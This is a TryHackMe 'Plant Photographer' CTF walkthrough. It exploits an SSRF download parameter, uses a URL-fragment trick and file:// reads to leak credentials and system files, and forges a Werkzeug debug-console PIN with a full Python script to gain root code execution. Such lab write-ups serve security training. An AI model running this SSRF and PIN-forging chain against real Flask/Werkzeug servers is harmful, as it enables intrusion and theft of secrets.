***Plant Photographer | TryHackMe | Walkthrough***

Initial Access

```bash
nmap -T4 -n -sC -sV -Pn 10.48.156.117
```

![nmap](/writeups/images/plant1.png)


There are two open ports:

22 (SSH)
80 (HTTP)



-T4 → Aggressive timing (faster scan, but noisier and more likely to be detected).
-n → No DNS resolution (speeds up scanning).
-sC → Run default scripts (Nmap’s built-in NSE scripts for common checks).
-sV → Version detection (tries to identify service versions).
-Pn → Treat all hosts as online (skip host discovery/ping). Useful if ICMP is blocked.
-p- → Scan all 65,535 TCP ports (instead of just the top 1,000).


What API key is used to retrieve files from the secure storage service



Visiting http://10.48.156.117/, we see a personal portfolio website that appears to be a fairly static site.


![site](/writeups/images/plant2.png)


One interesting thing to note is the Download Resume button, which links to:

```bash
http://10.48.156.117/download?server=secure-file-storage.com:8087&id=75482342
```
Clicking it returns a PDF containing a resume.


![site2](/writeups/images/plant3.png)

From the link, the server parameter immediately stands out, as it appears to specify where the file is downloaded from. We can start a listener on our machine and test this behavior by replacing the parameter value with our machine’s IP address.

![caid](/writeups/images/plant5.png)

Checking our listener confirms the presence of an SSRF vulnerability. Not only are we able to force the server to make a request to our machine, but the request also includes the API key flag in the headers. Additionally, the User-Agent header reveals that the application uses PycURL to perform the request.

![list](/writeups/images/plant6.png)

Port 80 listening
![ip](/writeups/images/plant7.png)

using our Ip
![cais](/writeups/images/plant8.png)


The second question tasks us with finding the flag in the admin section of the website, which we can find at http://10.114.154.89/admin. However, visiting it directly returns the message: Admin interface only available from localhost!!!
Boom we find the API path
![api](/writeups/images/plant9.png)

we can't access admin yet

![admin](/writeups/images/plant10.png)


So, instead of trying to access it directly, we can attempt to access it via the SSRF vulnerability discovered earlier:

```bash
http://10.48.156.117/download?server=secure-file-storage.com:8087/admin&id=75482342
```

However this does not work, as we receive a 404 error in the response.

![adminlog](/writeups/images/plant11.png)


Simply changing the host in our attempt to our own server with the request:

http://10.48.156.117/download?server=192.168.135.5/admin&id=75482342

shows why this happens as the server appends /public-docs-k057230990384293/<id>.pdf to the server parameter before making the request, resulting in the following request:

```bash
 nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.143.88] from (UNKNOWN) [10.48.156.117] 54842
GET /admin/public-docs-k057230990384293/75482342.pdf HTTP/1.1
```

Instead, also testing the id parameter interestingly causes an error due to the supplied value not being an integer, which exposes the Werkzeug debug page. This page not only leaks the application path (/usr/src/app/app.py), but also reveals snippets from the source code and examining the source confirms that the application uses PycURL and constructs the URL as <server>/public-docs-k057230990384293/<id>.pdf before making the request.

![adminlogs](/writeups/images/plant12.png)




Knowing that if we can just get rid of anything appended to our supplied server parameter, we can gain full control over the URL used in the request. We can come up with the idea to end our payload with # (URL-encoded as %23), which causes everything appended after it to be interpreted as a URI fragment, resulting in:

<server>#/public-docs-k057230990384293/<id>.pdf

With the request:

http://10.48.156.117/download?server=secure-file-storage.com:8087/admin%23&id=1

the constructed URL becomes:

secure-file-storage.com:8087/admin#/public-docs-k057230990384293/1.pdf

And due to the #, /public-docs-k057230990384293/1.pdf would be interpreted as the fragment portion of the URL, meaning the actual request is made only to:

secure-file-storage.com:8087/admin

Doing this we can see this works successfully, allowing us to obtain a PDF containing the second flag.

![adminlogsin](/writeups/images/plant13.png)

Redirects to:

![flag2](/writeups/images/plant14.png)

The third flag tasks us with reading a file present on the file system. To achieve this, we can make use of the file:// protocol, which curl has no problem handling, as shown below:

```bash
$ curl -s 'file:///etc/hostname'
kali
```
Not only that, but our # trick also works with the file:// protocol:

```bash
$ curl -s 'file:///etc/hostname#doesnotmatter'
kali
```

Although we are able to read files from the server this way, we do not yet know the filename of the flag. Instead, we can start by reading the application source code located at /usr/src/app/app.py, which we previously discovered from the error page.


![python](/writeups/images/plant15.png)


Examining the source code, one detail that stands out is that debug is set to True when running the server. This means we can access the Werkzeug Console at:

http://10.48.158.29/console

which allows execution of Python code. However, this functionality is protected by a PIN.

![console](/writeups/images/plant16.png)


The important detail about the Werkzeug Console PIN is that it is deterministically generated using information gathered from the server itself; data that we can also retrieve using our file disclosure vulnerability. A great HackTricks article explains this process in detail and also provides code that can be used to generate the PIN:

```bash
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

For this code to work, we only need to set the correct values for the probably_public_bits and private_bits variables.

First, we start with the probably_public_bits, specifically the username.

Reading the /proc/self/status file shows that the process is running with UID 0, and checking /etc/passwd confirms that this UID belongs to the root user.


![curll](/writeups/images/plant17.png)


For the getattr(mod, '__file__', None) value, we previously discovered from the error page that it is:

/usr/local/lib/python3.10/site-packages/flask/app.py

The values for modname and getattr(app, '__name__', getattr(app.__class__, '__name__')) are already correct, so the probably_public_bits become:

```bash
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
```


Next, we move on to the private_bits. The value returned by str(uuid.getnode()) corresponds to the MAC address of the machine expressed in decimal.

First, we obtain the network interface name (eth0) from /proc/net/arp:

![proc](/writeups/images/plant18.png)

Then, by reading /sys/class/net/eth0/address, we obtain the MAC address:

![mac](/writeups/images/plant19.png)


We convert it to decimal:

![dec](/writeups/images/plant20.png)


Lastly, we determine the machine ID. As explained in HackTricks article, get_machine_id() concatenates data from /etc/machine-id or /proc/sys/kernel/random/boot_id with the portion of first line from the /proc/self/cgroup after the final /. The relevant part of the Werkzeug source code is also shown as below in the HackTricks article:


```bash
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

            ```

 Next, we read /proc/sys/kernel/random/boot_id to obtain the boot ID:


 ![read](/writeups/images/plant21.png)

Finally, we read /proc/self/cgroup and extract everything after the last / on the first line:

![decgrp](/writeups/images/plant22.png)

With this information, we can construct the private_bits as follows:


```bash
private_bits = [
    '2485378088962',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    '4183895a-db64-4bc2-a0bc-3b426456659477c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # get_machine_id()
]
```
We then replace these values in the provided script:


![cat](/writeups/images/plant23.png)


```bash
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378088962',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    '4183895a-db64-4bc2-a0bc-3b426456659477c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # get_machine_id()
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
Running the script successfully generates a Werkzeug console PIN:


![pincode](/writeups/images/plant24.png)
![pinenter](/writeups/images/plant25.png)

Reviewing the requests made to the target, we can see from the Server response header that the application is running Werkzeug/0.16.0, which was released in 2019 and is quite old, and that the method Werkzeug uses to generate the debug PIN has changed significantly across versions.


![caidoread](/writeups/images/plant26.png)


To understand how Werkzeug version 0.16.0 specifically generates the PIN, we can either read /usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py directly from the server or review the source code on GitHub. Doing so reveals two crucial differences compared to how we previously generated the PIN code.

First, the way the machine ID is constructed differs. Unlike the method described in the HackTricks article, version 0.16.0 does not concatenate data from multiple files. Instead, if /proc/self/cgroup can be read successfully, it simply uses the value from it as the machine ID:


```bash
def get_machine_id():
    global _machine_id
    rv = _machine_id
    if rv is not None:
        return rv

    def _generate():
        # docker containers share the same machine id, get the
        # container id instead
        try:
            with open("/proc/self/cgroup") as f:
                value = f.readline()
        except IOError:
            pass
        else:
            value = value.strip().partition("/docker/")[2]

            if value:
                return value

...

    _machine_id = rv = _generate()
    return rv




```
    In our case, this means that the machine ID is simply: 77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca

   ![cat11](/writeups/images/plant27.png)

   ```bash
   $ curl -s 'http://10.114.154.89/download?server=file:///proc/self/cgroup%23&id=1' -o- | head -n 1
12:cpuset:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
```
We must therefore correct our private_bits as follows:

```bash
private_bits = [
    '2485378088962',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # get_machine_id()
]
```
Second, although the HackTricks article mentions that older versions use MD5 instead of SHA1, inspecting the 0.16.0 source code confirms that this is indeed the case:

```bash
...
    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")
...
```
Therefore, we must also update our exploit code accordingly:

h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
# h = hashlib.sha1()


```bash
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378088962',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # get_machine_id()
]

h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
# h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
Running the script now produces a different PIN, as expected:

   ![genpin](/writeups/images/plant28.png)


Testing this PIN at http://10.114.154.89/console shows that it works, allowing us to execute Python code through the Werkzeug console. Using the os module, we can easily achieve command execution, which allows us to discover the filename containing the flag and read it, successfully completing the room.

   ![console](/writeups/images/plant29.png)

Run read code

   ![root](/writeups/images/plant30.png)

   
